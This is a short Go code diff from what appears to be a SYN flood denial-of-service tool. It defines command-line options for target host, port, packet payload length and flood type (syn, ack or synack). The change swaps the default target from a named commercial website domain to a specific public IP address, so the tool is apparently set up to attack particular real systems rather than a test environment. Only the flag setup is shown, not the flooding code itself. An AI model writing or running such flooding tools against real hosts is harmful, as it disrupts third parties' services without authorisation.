@@ -29,7 +29,7 @@ type SynFloodOptions struct {
 }
 
 func (sfo *SynFloodOptions) addFlags(fs *pflag.FlagSet) {
-	fs.StringVar(&sfo.Host, "host", "denizlifiliztekstil.com", "Provide public ip or DNS of the target")
+	fs.StringVar(&sfo.Host, "host", "213.238.175.187", "Provide public ip or DNS of the target")
 	fs.IntVar(&sfo.Port, "port", 443, "Provide reachable port of the target")
 	fs.IntVar(&sfo.PayloadLength, "payloadLength", 1500, "Provide payload length in bytes for each SYN packet")
 	fs.StringVar(&sfo.FloodType, "floodType", "syn", "Provide the attack type. Proper values are: syn, ack, synack")
